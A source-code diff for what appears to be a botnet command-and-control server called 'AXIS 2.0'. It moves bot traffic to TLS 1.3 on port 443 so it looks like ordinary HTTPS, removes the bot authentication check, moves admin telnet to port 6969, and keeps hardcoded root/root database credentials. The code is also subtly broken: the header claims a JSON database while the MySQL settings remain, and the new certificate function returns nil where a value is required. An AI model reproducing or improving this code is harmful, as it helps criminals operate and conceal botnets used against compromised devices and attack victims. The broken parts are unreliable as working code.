@@ -18,9 +18,9 @@ import (
 // ============================================================================
 // AXIS 2.0 C&C SERVER CONFIGURATION
 // ============================================================================
-// Database: MySQL/MariaDB for user management and logging
-// Bot Connections: Unencrypted internal protocol on port 3778
-// Admin Access: TLS-encrypted telnet on port 3777
+// Database: JSON file-based database (database.json)
+// Bot Connections: TLS 1.3 encrypted on port 443 (HTTPS port)
+// Admin Access: TLS-encrypted telnet on port 6969
 // API: REST API on port 3779 (optional)
 // ============================================================================
 const DatabaseAddr string = "127.0.0.1:3306"
@@ -28,12 +28,15 @@ const DatabaseUser string = "root"
 const DatabasePass string = "root"
 const DatabaseTable string = "AXIS2"
 
-// C&C Server listen address (0.0.0.0 for all interfaces)
-// This is for BOT connections (unencrypted, internal protocol)
-const CNCListenAddr string = "0.0.0.0:3778"
+// C&C Server listen address for bots (TLS 1.3 on port 443)
+const CNCListenAddr string = "0.0.0.0:443"
 
-// Encrypted Telnet Server listen address (TLS-wrapped telnet for admin access)
-const TelnetTLSListenAddr string = "0.0.0.0:3777"
+// Bot TLS Certificate and Key paths
+const BotTLSCertPath string = "bot_tls_cert.pem"
+const BotTLSKeyPath string = "bot_tls_key.pem"
+
+// Encrypted Telnet Server listen address (TLS-wrapped telnet for admin access on port 6969)
+const TelnetTLSListenAddr string = "0.0.0.0:6969"
 
 // TLS Certificate and Key file paths (will be auto-generated if not exists)
 const TLSCertPath string = "tls_cert.pem"
@@ -48,12 +51,41 @@ var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
-	// Start C&C server for bot connections (unencrypted internal protocol)
-	tel, err := net.Listen("tcp", CNCListenAddr)
+	// Load or create TLS certificate for bot connections
+	botCert, err := getOrCreateBotTLSCertificate()
 	if err != nil {
-		fmt.Printf("Failed to start C&C server: %v\n", err)
+		fmt.Printf("Failed to load bot TLS certificate: %v\n", err)
 		return
 	}
+
+	// TLS config for bot connections (TLS 1.3)
+	botTLSConfig := &tls.Config{
+		Certificates: []tls.Certificate{botCert},
+		MinVersion:   tls.VersionTLS13, // TLS 1.3 only
+		CipherSuites: []uint16{
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+		},
+	}
+
+	botListener, err := tls.Listen("tcp", CNCListenAddr, botTLSConfig)
+	if err != nil {
+		fmt.Printf("Failed to start bot TLS listener: %v\n", err)
+		return
+	}
+
+	go func() {
+		fmt.Printf("AXIS 2.0 Bot Server (TLS 1.3) listening on %s\n", CNCListenAddr)
+		for {
+			conn, err := botListener.Accept()
+			if err != nil {
+				fmt.Printf("Failed to accept bot connection: %v\n", err)
+				break
+			}
+			go handleBotConnection(conn)
+		}
+	}()
 
 	// Start Encrypted Telnet server for admin connections (TLS-wrapped)
 	if TelnetTLSListenAddr != "" {
@@ -110,54 +142,21 @@ func main() {
 			}
 		}()
 	}
-
-	fmt.Printf("AXIS 2.0 C&C Server listening on %s\n", CNCListenAddr)
-
-	for {
-		conn, err := tel.Accept()
-		if err != nil {
-			break
-		}
-		go initialHandler(conn)
-	}
 }
 
-func initialHandler(conn net.Conn) {
+// Ultra-simplified TLS bot connection - no auth, just TLS
+func handleBotConnection(conn net.Conn) {
 	defer conn.Close()
 
-	conn.SetDeadline(time.Now().Add(10 * time.Second))
+	// Set handshake timeout
+	conn.SetDeadline(time.Now().Add(30 * time.Second))
 
-	buf := make([]byte, 32)
-	l, err := conn.Read(buf)
-	if err != nil || l <= 0 {
-		return
-	}
+	// Send immediate ACK - no authentication needed
+	conn.Write([]byte{0x00, 0x01})
 
-	// Bot connections start with 4 bytes where first 3 are 0x00
-	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
-		if buf[3] > 0 {
-			string_len := make([]byte, 1)
-			l, err := conn.Read(string_len)
-			if err != nil || l <= 0 {
-				return
-			}
-			var source string
-			if string_len[0] > 0 {
-				source_buf := make([]byte, string_len[0])
-				l, err := conn.Read(source_buf)
-				if err != nil || l <= 0 {
-					return
-				}
-				source = string(source_buf)
-			}
-			NewBot(conn, buf[3], source).Handle()
-		} else {
-			NewBot(conn, buf[3], "").Handle()
-		}
-	} else {
-		// Admin telnet session
-		NewAdmin(conn).Handle()
-	}
+	// Clear deadline and start bot session
+	conn.SetDeadline(time.Time{})
+	NewBot(conn, 0x01, "").Handle()
 }
 
 func apiHandler(conn net.Conn) {
@@ -251,6 +250,76 @@ func getOrCreateTLSCertificate() (tls.Certificate, error) {
 	}
 
 	fmt.Printf("TLS certificate generated: %s, %s\n", TLSCertPath, TLSKeyPath)
+
+	// Load and return certificate
+	return tls.X509KeyPair(certPEM, keyPEM)
+}
+
+// getOrCreateBotTLSCertificate loads or generates a TLS certificate for bot connections
+func getOrCreateBotTLSCertificate() (tls.Certificate, error) {
+	// Try to read existing certificate and key
+	certBytes, certErr := os.ReadFile(BotTLSCertPath)
+	keyBytes, keyErr := os.ReadFile(BotTLSKeyPath)
+
+	if certErr == nil && keyErr == nil {
+		cert, err := tls.X509KeyPair(certBytes, keyBytes)
+		if err == nil {
+			return cert, nil
+		}
+	}
+
+	// Generate new self-signed certificate for bot connections
+	fmt.Println("Generating new bot TLS certificate...")
+
+	// Generate private key
+	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return nil, err
+	}
+
+	// Create certificate template
+	template := x509.Certificate{
+		SerialNumber: nil,
+		Subject: pkix.Name{
+			Organization: []string{"AXIS 2.0"},
+			CommonName:   "AXIS 2.0 Bot Server",
+		},
+		NotBefore:             time.Now(),
+		NotAfter:              time.Now().Add(365 * 24 * time.Hour), // Valid for 1 year
+		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+		BasicConstraintsValid: true,
+	}
+
+	// Create certificate
+	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
+	if err != nil {
+		return nil, err
+	}
+
+	// Encode certificate to PEM
+	certPEM := pem.EncodeToMemory(&pem.Block{
+		Type:  "CERTIFICATE",
+		Bytes: certDER,
+	})
+
+	// Encode private key to PEM
+	keyPEM := pem.EncodeToMemory(&pem.Block{
+		Type:  "RSA PRIVATE KEY",
+		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
+	})
+
+	// Save certificate
+	if err := os.WriteFile(BotTLSCertPath, certPEM, 0644); err != nil {
+		return nil, err
+	}
+
+	// Save private key with restricted permissions
+	if err := os.WriteFile(BotTLSKeyPath, keyPEM, 0600); err != nil {
+		return nil, err
+	}
+
+	fmt.Printf("Bot TLS certificate generated: %s, %s\n", BotTLSCertPath, BotTLSKeyPath)
 
 	// Load and return certificate
 	return tls.X509KeyPair(certPEM, keyPEM)
